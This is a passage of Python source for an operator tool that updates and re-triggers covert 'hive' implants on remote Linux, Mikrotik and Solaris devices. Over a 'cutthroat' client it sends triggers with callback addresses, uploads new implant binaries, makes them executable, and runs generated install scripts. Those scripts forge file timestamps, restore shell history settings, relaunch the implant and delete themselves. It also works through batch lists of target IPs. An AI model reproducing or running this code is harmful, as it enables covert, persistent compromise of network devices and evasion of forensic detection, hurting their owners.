		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(" ")
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" 2>/dev/null\n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write("#  Transferred time information back \n")
		installationFile.write('touch -r ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Payload', 'tempPayload', 0)+" ")
		installationFile.write(' ')
		installationFile.write( self.get('Remote', 'installationDirectory', 0) )
		installationFile.write(self.get('Remote', 'oldImplant', 0) )
		installationFile.write(' 2>/dev/null\n')
		installationFile.write('sleep 2\n')
		installationFile.write('\n')

		#installationFile.write('/usr/bin/nohup /export/home/hived-solaris-sparc-PATCHED & \n')
		installationFile.write('/usr/bin/nohup ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0)+self.get('Remote', 'oldImplant', 0))
		installationFile.write(" & \n")
		installationFile.write('sleep 5\n')
		installationFile.write('\n')

		installationFile.write('#Remove tempPayload file if it exists\n')
		#installationFile.write('rm -f /export/home/newhive 2>/dev/null\n')
		installationFile.write('rm -f ')
		installationFile.write(self.get('Remote', 'installationDirectory', 0))
		installationFile.write(self.get('Payload', 'tempPayload', 0))
		installationFile.write(" 2>/dev/null\n")
		installationFile.write('\n')

		installationFile.write("#Reset History.\n")
		installationFile.write("HISTSIZE=$OLDHISTSIZE\n")
		installationFile.write("export HISTSIZE\n")
		installationFile.write("set HISTFILE $OLDHISTFILE\n")
		installationFile.write("export HISTFILE\n")
		installationFile.write('\n')

		installationFile.write('#Remove the installation script...\n')
		installationFile.write('rm -f $fileToDelete 2>/dev/null\n')
		installationFile.close()

	#================================================================
	def makeInstallationScript(self):
		'''
		Depending on the operatingSystem of the remote targgeted box, creates the installation
		script by calling on of the following:

		self.make_Linux_hiveUpdateInstallationScript()
		self.make_MT_hiveUpdateInstallationScript()
		self.make_Solaris_hiveUpdateInstallationScript()

		'''

		#Delete the installFile  if it exists now for convenience and recreate it...
		if os.path.isfile(self.get('Payload', 'installation_Script_Name',0)):
			os.remove(self.get('Payload', 'installation_Script_Name',0))

		OS = self.get('Remote', 'operatingSystem', 0)

		#Linux
		if OS == "Linux":
			self.make_Linux_hiveUpdateInstallationScript()
	
		#Mikrotik	
		elif  OS == "Mikrotik PPC":
			self.make_MT_hiveUpdateInstallationScript()
		elif OS == "Mikrotik x86":
			self.make_MT_hiveUpdateInstallationScript()
		elif OS == "Mikrotik MIPS LE":
			self.make_MT_hiveUpdateInstallationScript()
		elif OS == "Mikrotik MIPS BE":
			self.make_MT_hiveUpdateInstallationScript()
	
		#Solaris		
		elif OS == "Solaris Sparc":
			print "\n\n\n Making Solaris Script\n\n\n"
			self.make_Solaris_hiveUpdateInstallationScript()
		elif OS == "Solaris x86":
			self.make_Solaris_hiveUpdateInstallationScript()

		else:
			print "\n\n This only works for MT, Linux, or Solaris systems at this time.\n\n"

#================================================================
	def runHiveOperation(self):
		'''
		If the configuration File operation is set to 'hiveUpdate' it runs the runSingleUpdateOperation function.
		If the configuration File operation is set to 'hiveResetTimer', it will execute the runSingleResetOperation.
		'''

		print "\n\n runHiveOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now starting..."
		
		if self.get('Payload', 'operation', 0) == 'hiveUpdate':
			self.runSingleUpdateOperation()
		elif self.get('Payload', 'operation', 0) == 'hiveResetTimer':
			self.runSingleResetOperation()
		else:
			print "\n\n runHiveOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " No Valid Operations Found."
		
			

#================================================================
	def runHiveConnectOperation(self):
		'''
		Uses pexpect to connect to the the target hive machine maintaining a log file 
		simultaneously called cutthroat_hiveOperation_yyyymmdd_HHMMSS.log
		'''

		#           Pexpect starts cutthroat
		#
		#          ./cutthroat ./hive
		#
		#
		#Starts cutthroat and displays the initial startup
		commandLine="./cutthroat ./hive"
		print "Trying to spawn "+commandLine
		cutT = pexpect.spawn(commandLine)
		if self.logfileName == "None":
			now=datetime.now()
			self.logfileName="cutthroat_hiveOperation_"+now.strftime('%Y%m%d_%H%M%S.')+"log"
			print "\n\nSetting Log File to %s\n\n"  % (self.logfileName) 
			fout = file(self.logfileName, 'w')
		else:
			fout = file(self.logfileName, 'a')

		cutT.logfile=fout

		#Save cutT for use in other operations...
		self.cutT = cutT

		#Always set connectionStatus to false at the beginning of this function.
		#Only this function will set the connectionStatus except for init...
		self.connectionStatus = False;
	
		print "\n\n runHiveConnectOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now starting..."

		hiveTimeout = self.get('Remote','hiveTimeout',0)

		index = cutT.expect( ['> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )

		if index == 0:
			print "Matched first index of \>"
			print cutT.before
			print cutT.after

		elif index == 1:
			print "FAILED MATCH: Desired match did not occur..."
			print cutT.before
			print cutT.after

		elif index == 2:
			print "Timeout of %d occurred." % (self.defaultTimeout)
			print cutT.before
			print cutT.after

		#pattern="['> ', pexpect.EOF, pexpect.TIMEOUT]"
		#cut_3_interface( cutT,  pattern, 20)

		if validIP( self.get('Remote', 'remoteIP', 0) ):
			pass
		else:
			print "\n\n\n\n\n runHiveConnectOperation:  RemoteIP must be set...\n\n\n\n\n\n"
			sys.exit()

		#We will delete any previously built files for this remoteIP for convenience
		if os.path.isfile(self.get('Remote', 'remoteIP', 0)):
			os.remove(self.get('Remote', 'remoteIP', 0))

		print "Starting connect sequence."
		#
		#
		#            ilm connect ${remoteIP}
		#
		#
		#connection='ilm connect 10.2.9.6'
		connection='ilm connect '+self.get('Remote', 'remoteIP', 0) +''
		cutT.sendline(connection)

		#This section assumes the remoteIP file does not exist so it prompts the user for input...
		index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )
		if index == 0:
			print cutT.before
		elif index == 1:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 2:
			print "Timeout of %d occurred." % (self.defaultTimeout)
			print cutT.before
			print cutT.after

		#cutT.sendline('  10.3.2.19')    #callback address
		cutT.sendline('  '+self.get('Local', 'localIP', 0))    #callback address

		patternA="\?"
		cut_3_interface( cutT,  patternA, 20, "callbackIPsent")

		cutT.sendline('  '+self.get('Local', 'localPort', 0))        #callback port
		cut_3_interface( cutT,  patternA, 20, "callbackPortsent")

		#cutT.sendline("  10.2.9.6")    #remote IP Address
		cutT.sendline('  '+self.get('Remote', 'remoteIP', 0))    #remote IP Address
		cut_3_interface( cutT,  patternA, 20, "remoteIPsent")

		#cutT.sendline("  dns-request")
		cutT.sendline('  '+self.get('Remote', 'triggerProtocol', 0))

		if (self.get('Remote', 'triggerProtocol', 0) == "raw-udp") or (self.get('Remote', 'triggerProtocol', 0) == "raw-tcp"):
			cut_3_interface( cutT,  patternA, 15, "rawTriggersent")
			cutT.sendline('  '+str(self.get('Remote', 'remotePort', 0)))

		#
		#
		#      Sends the trigger...
		#
		#
		index = cutT.expect( [' Trigger sent.', '> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )
		if index == 0:
			print cutT.before
			print cutT.after
			now=datetime.now()
			print "      Sent on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
		elif index == 1:
			print "Matched >, raw-tcp post on remote host could not be reached..."
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of %d occurred." % (self.defaultTimeout)
			print cutT.before
			print cutT.after

		print "\n\n Waiting... \n\n"
		response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
		index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=int(hiveTimeout) )
		if index == 0:
			print "Received response."
			print "\n\nself.connectionStatus being set to True...\n\n"
			self.connectionStatus = True;
			print cutT.before
			print cutT.after
		elif index == 1:
			print "Failure occurred"
			self.connectionStatus = False;
			print cutT.before
			print cutT.after
		elif index == 2:
			print "EOF occurred"
			self.connectionStatus = False;
			print cutT.before
			print cutT.after
		elif index == 3:
			print "Timeout of %d occurred." % (int(hiveTimeout))
			now=datetime.now()
			print "      Trigger Timed out on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			self.connectionStatus = False;
			print cutT.before
			print cutT.after
			print "\n\nFAILED INITIAL TRIGGER RESPONSE from "+self.get('Remote', 'remoteIP', 0)+".\n\n"
		
		print "\n\n runHiveConnectOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now ending..."

	#================================================================
	def runSingleUpdateOperation(self):
		'''
		Uses pexpect to upload new implant, installScript, and make them executable while 
		maintaining a log file simultaneously called cutthroat_hiveOperation_yyyymmdd_HHMMSS.log
		'''


		#Create Installation File
		self.makeInstallationScript()

		#Establishes initial connection to hive server
		self.runHiveConnectOperation()

		#runHiveConnectOperation establishes cutT...
		cutT = self.cutT

		if self.connectionStatus == True:
	
			print "\n\n runSingleUpdateOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now starting..."
		
			#           Pexpect starts cutthroat
			#
			#          ./cutthroat ./hive
			#
			#
			#Starts cutthroat and displays the initial startup

			#fileName=logFile
			#fout = file(fileName, 'w')
			#cutT.logfile=fout

			ctCommand= "  file put "+self.get('Payload', 'newPayload', 0)+" "+self.get('Remote', 'installationDirectory', 0) + self.get('Payload', 'tempPayload', 0)
			cutT.sendline(ctCommand)
			#
			#
			#      Sends the updated hive...
			#
			#
			response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
			index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )

			if index == 0:
				print "Received response."
				print cutT.before
				print cutT.after
				now=datetime.now()
				print "      Updated hive sent as newhive on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			elif index == 1:
				print "Failed..."
				print cutT.before
				print cutT.after
			elif index == 2:
				print "EOF occurred"
				print cutT.before
				print cutT.after
			elif index == 3:
				print "Timeout of %d occurred." % (self.defaultTimeout)
				print cutT.before
				print cutT.after
	
			#  This line is specific to mikrotik routers for now...
			#cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/newhive\"")
			ctCommand= "  cmd exec \"chmod 755 "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'tempPayload', 0)+"\""
			cutT.sendline(ctCommand)
			#
			#
			#      Makes the tempPayload executable...
			#
			#
			response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
			index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )

			if index == 0:
				print "tempPayload executable response."
				print cutT.before
				print cutT.after
				now=datetime.now()
				print "      Updated tempPayload is executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			elif index == 1:
				print "Failed..."
				print cutT.before
				print cutT.after
			elif index == 2:
				print "EOF occurred"
				print cutT.before
				print cutT.after
			elif index == 3:
				print "Timeout of %d occurred." % (self.defaultTimeout)
				print cutT.before
				print cutT.after

			#  The following line is specific to mikrotik routers for now...
			#cutT.sendline("  file put installScript /rw/pckg/installScript")
			ctCommand= "  file put "+self.get('Payload', 'installation_Script_Name', 0)+" "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)
			cutT.sendline(ctCommand)
			#
			#
			#      Sends the installScript...
			#
			#
			response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
			index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )

			if index == 0:
				print self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+ " installed response."
				print cutT.before
				print cutT.after
				now=datetime.now()
				print "      installScript ["+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+"] is put on device at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			elif index == 1:
				print "Failed..."
				print cutT.before
				print cutT.after
			elif index == 2:
				print "EOF occurred"
				print cutT.before
				print cutT.after
			elif index == 3:
				print "Timeout of %d occurred." % (self.defaultTimeout)
				print cutT.before
				print cutT.after

			#  This line is specific to mikrotik routers for now...
			#cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/installScript\"")
			ctCommand= "  cmd exec \"chmod 755 "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+"\""
			cutT.sendline(ctCommand)
			#
			#
			#      Makes the installScript executable...	
			#
			#
			response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
			index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=self.defaultTimeout )

			if index == 0:
				print "installedScript ["+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+" executable response."
				print cutT.before
				print cutT.after
				now=datetime.now()
				print "      installScript is now executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
			elif index == 1:
				print "Failed..."
				print cutT.before
				print cutT.after
			elif index == 2:
				print "EOF occurred"
				print cutT.before
				print cutT.after
			elif index == 3:
				print "Timeout of %d occurred." % (self.defaultTimeout)
				print cutT.before
				print cutT.after

			#  This line is specific to mikrotik routers for now...
			now=datetime.now()
			#cutT.sendline("  cmd exec /rw/pckg/installScript")
			ctCommand= "  cmd exec "+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)
			cutT.sendline(ctCommand)
			#
			#
			#      Runs the installScript ...    Note that the hive trigger should now timeout
			#                                      since the install script should remove 
			#                                      all currently running hive processes including
			#                                      our currently triggered implant and replace the
			#                                      existing hive with the new hive implant...
			#
			#
			response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
			index = cutT.expect( [ pexpect.TIMEOUT, response, 'Failure', pexpect.EOF] , timeout=int(self.defaultTimeout + 180) )

			if index == 0:
				print "Expected timeout occurred since the existing hive is currently being replaced..."
				print cutT.before
				print cutT.after
				print "      installScript ["+self.get('Remote', 'installationDirectory', 0)+self.get('Payload', 'installation_Script_Name', 0)+" was started at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
				now=datetime.now()
				print "      Hive should have been replaced by now at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs after " + str( self.defaultTimeout + 180) + " seconds timeout."
			elif index == 1:
				print "Should never have gotten here for the response...  ERROR   ERROR  ERROR"
				print cutT.before
				print cutT.after
			elif index == 2:
				print "Should never have gotten here for Failure...  ERROR   ERROR  ERROR"
				print cutT.before
				print cutT.after
			elif index == 3:
				print "EOF occurred"
				print cutT.before
				print cutT.after

			print "\n\n runSingleUpdateOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now ending..."

			#Re-Establishing Connection to test update
			self.runSingleResetOperation()

		else:

			self.logFinalOperationResult("--FAILURE, NO CONNECTION DURING runSingleUpdateOperation--")

	#================================================================
	def runSingleResetOperation(self):
		'''
		Uses pexpect to Connect to the the target hive machine then immediately disconnect
		maintaining a log file simultaneously called cutthroat_hiveOperation_yyyymmdd_HHMMSS.log
		'''

		hiveTimeout = self.get('Remote','hiveTimeout',0)

		#Establishes initial connection to hive server
		self.runHiveConnectOperation()

		#runHiveConnectOperation establishes cutT...
		cutT = self.cutT

		if self.connectionStatus == True:

			print "\n\n runSingleResetOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now starting..."

			ctCommand= "  quit "
			cutT.sendline(ctCommand)
			#
			#
			#      Closing Connection ...          
			#
			#
			response="\["+self.get('Remote', 'remoteIP', 0)+"\]> "
			index = cutT.expect( [ pexpect.TIMEOUT, response, 'Failure', pexpect.EOF] , timeout=self.defaultTimeout )

			if index == 0:
				print "Should never have gotten here for the TimeOut...  ERROR   ERROR  ERROR"
				self.logFinalOperationResult("--FAILURE, index0--")
				print cutT.before
				print cutT.after
			elif index == 1:
				print "Should never have gotten here for the response...  ERROR   ERROR  ERROR"
				self.logFinalOperationResult("--FAILURE, index1--")
				print cutT.before
				print cutT.after
			elif index == 2:
				print "Should never have gotten here for Failure...  ERROR   ERROR  ERROR"
				self.logFinalOperationResult("--FAILURE, index2--")
				print cutT.before
				print cutT.after
			elif index == 3:
				print "EOF occurred This is to be expected. CONNECTION SUCCESSFUL"
				self.logFinalOperationResult("--SUCCESSFUL--")
				print cutT.before
				print cutT.after


			print "\n\n runSingleResetOperation:  " + self.get('Payload', 'operation', 0) + "   for " + self.get('Remote', 'remoteIP', 0 ) + " now ending..."


		else:

			self.logFinalOperationResult("--FAILURE, NO CONNECTION DURING runSingleResetOperation--")



	#================================================================
	def runBatchOperation(self):
		'''
		Uses the hiveConfiguration Files target list to update the remote hive Implants.  It also
		processes the target list and attempts to perform the operation (i.e hiveUpdate or hiveResetTimer) 
		only if the ip address is a valid IP.  Invalid IP addresses are ignored with an error message displayed.
		'''

		if self.getOperation() == "hiveUpdate":
			#Create Installation File
			self.makeInstallationScript()

		#Target List takes priority over singleIP for now...
		if os.path.isfile(self.get('Targets', 'list', 0)):
			file = open(self.get('Targets', 'list', 0), "r")
			ips=[]
			for text in file.readlines():
				text = text.strip()
				if not text == '':
					ips.append(text)

			processCount = 0
			for ip in ips:
				processCount=processCount  + 1
				if validIP(ip):
					self.set('Remote', 'remoteIP', str(ip))
					print "\n\n Batch Job now processing "+self.getTargetList()+" line "+str(processCount)+" for target IP = "+self.get('Remote', 'remoteIP', 0)+"...\n"
					self.runHiveOperation()
					print "\n\n Batch Job done processing "+self.getTargetList()+" line "+str(processCount)+" for target IP = "+self.get('Remote', 'remoteIP', 0)+"...\n"
				else:
					print "\n\nInvalid IP ["+str(ip)+"] submitted for batch processing.\n\n"
			file.close()

		else:
			print "\n\n NO TARGET LIST ["+self.get('Targets', 'list', 0)+"] for batch processing with "+self.get('Payload', 'operation', 0)+ " \n\n"
			sys.exit()



#====================================================================================================================
	

if __name__ == "__main__":
	os.system("clear")


	usage = "Usage: %prog [options] -f hiveConfigurationFile"
	parser = OptionParser(usage=usage)
	parser.add_option("-s", "--single", action="store_true", dest="single", default=False)
	parser.add_option("-b", "--batch", action="store_true", dest="batch", default=False)
	parser.add_option("-f", "--fileName", action="store", dest="hiveConfigurationFile", default=None)
	(options, args) = parser.parse_args()

	if options.hiveConfigurationFile == None:
		print "\n\n No hiveConfiguration fileName was provided but it is required.  Use -h option for details...\n\n"
		sys.exit(-1)

	print "  hiveConfigurationFile: [%s].\n" % (options.hiveConfigurationFile)

	if options.single == True and options.batch == True:
		print "\n\nInvalid options since both batch and single mode processing was selected.\n\n"
		sys.exit(-1)
	elif options.single == False and options.batch == False:
		print "\n\nInvalid options since neither batch or single mode processing was selected.\n\n"
		sys.exit(-1)
	elif options.single == True and options.batch == False:
		hiveReset = hiveConfigParser( options.hiveConfigurationFile ,  "single")
	elif options.single == False and options.batch == True:
		hiveReset = hiveConfigParser( options.hiveConfigurationFile ,  "batch")
	else:
		print "\n\n   Should never get here!!!!\n\n"
		sys.exit(-1)
 
	if os.path.isfile( hiveReset.configFileName ):
		hiveReset.read( hiveReset.configFileName )
	else:
		hiveReset.setConfigurationSettings( )
		hiveReset.read( hiveReset.configFileName )
	
	hiveReset.verifyModes()

	if hiveReset.getLocalMode() == "batch":
		if os.path.isfile(hiveReset.getTargetList()):
			hiveReset.runBatchOperation()
		else:
			print "\n\n No targetList [%s] file exists for batch processing...\n\n" % (hiveReset.getTargetList())
	elif hiveReset.getLocalMode() == "single":
		if validIP( hiveReset.getRemoteIP() ):
			#Run the hiveReset.runSingleUpdateOperation()
			hiveReset.runHiveOperation()
		else:
			print " \n\n Invalid IP Address passed in and no Target List file.\n\n"
			sys.exit()
	else:
		print "\n\n Failed processing mode... No processing will occur!\n\n"
		sys.exit()



